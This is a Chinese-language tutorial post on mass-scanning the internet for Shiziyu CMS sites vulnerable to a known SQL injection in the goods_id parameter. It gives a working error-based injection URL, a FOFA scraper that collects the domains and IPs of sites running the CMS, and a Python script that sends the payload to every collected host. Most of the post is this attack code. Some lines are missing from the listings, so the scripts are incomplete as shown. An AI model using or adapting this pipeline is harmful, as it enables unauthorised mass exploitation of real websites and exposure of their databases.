那么怎么批量的去找漏洞呢？

需要通杀漏洞。

一个漏洞点可以验证所有使用这个CMS，这个框架，这个中间件，这个服务器的站点。

如果有0day，那将无敌。

但是对于我们新手来说，目前可能没有0day挖掘的能力；但是我们可以找Nday呀

最好是1day.

先自己把这个漏洞复现出来，知道原理之后就可以批量去验证洞了

我这里使用的例子就是一个nday.

狮子鱼CMS-SQL注入

漏洞成因：

狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞

分析：

造成这个SQL注入的原因是：

ApiController.class.php 中没有对参数$good_id进行过滤。

POC：

https://www.xxx.com/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)

验证成功了说明这个洞有效，接下来我们就可以批量的去验证这个洞。


fofa语句也提供了，正常情况下我们需要点开一个个站点去验证。


但是如果我们会爬虫，把fofa语法搜索出来的结果ip跟域名保存下来，然后写程序去请求这个保存下来的IP进行验证，那我们不就只需要等着就行了吗。

fofa爬虫

如果有fofa会员的话，fofa是提供api的，他会把你请求的结果用json格式的数据返回给你，你可以直接解析里的各项信息，包括域名跟ip,还是很方便的。


但是，我们是白嫖怪，会员是不可能开的。


普通注册会员fofa提供50条结果，所以注册一下为好。


这里直接提供给各位没有会员的fofa爬虫。


FOFA爬虫：

  2. import urllib3
  3. from lxml import etree

  13. # fofa搜索结果url，qbase是搜索内容的base64加密结果，page_size是每页多少个，page是页数
  14. base_url = "https://fofa.so/result?qbase64=Ii9zZWxsZXIucGhwP3M9L1B1YmxpYy9sb2dpbiIgJiYgaXNfZG9tYWluPXRydWU%3D&page_size=50&page="


  17. def get_domainList(url):
  18.     response = requests.get(url=url, verify=False, headers=headers)
  19.     selector = etree.HTML(response.text)
  20.     domainList = selector.xpath('//span[@class="aSpan"]/a/text()')
  21.     # print("domainlist:", domainList)
  22.     return domainList


  25. def get_IPLIst(url):
  26.     response = requests.get(url=url, verify=False, headers=headers)
  27.     selector = etree.HTML(response.text)
  28.     IPList = selector.xpath('//div[@class="contentMain"]/div[@class="contentLeft"]/p[2]/a[@class="jumpA"]/text()')
  29.     # print("iplist:", IPList)
  30.     return IPList


  33. def write_list(listName, filename):
  34.     f = open(filename, 'a', encoding='utf-8')
  35.     print("writeing in : ", filename)
  36.     for list1 in listName:
  37.         print(list1)
  38.         f.write(list1 +('\n'))
  39.     f.close()


  42. def main():
  43.     for i in range(1, 6):
  44.         url = base_url+str(i)
  45.         domainList = get_domainList(url)
  46.         IPList = get_IPLIst(url)
  47.         write_list(domainList, "./save_file/shiziyuSQL-domainList.txt")
  48.         write_list(IPList, "./save_file/shiziyuSQL-IPList.txt")
  49.     print("save success!")

  51. if __name__ == '__main__':
  52.     main()

结果会保存在shiziyuSQL-domainList.txt和shiziyuSQL-IPList.txt中。

POC


  1. # -*- coding:utf-8 -*-
  2. import requests
  3. import re
  4. import json
  5. import sys
  6. import urllib3

  8. urllib3.disable_warnings() #忽略https证书告警

  10. vunl_path = "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"

  12. def POC(url):
  13.     target_url = url + vunl_path
  14.     headers = {
  15.         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",

  17.     }
  18.     try:
  19.         response = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
  20.         print("正在测试：", target_url)
  21.         if "syntax" in response.text:
  22.             print("上述地址存在SQL注入")

  24.     except Exception as e:
  25.         print("请求失败！")
  26.         sys.exit(0)

  28. if __name__ == '__main__':
  29.     print("python3 poc.py http://xx.xx.xx.xx")

  31.     with open("./save_file/shiziyuSQL-domainList.txt", "r") as f:
  32.         results = f.readlines()
  33.         for result in results:
  34.             if "http" in result:

  39.                 url = url.strip()
  40.                 POC(url)

这个脚本会在保存的域名列表后加上漏洞路径：”/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)“
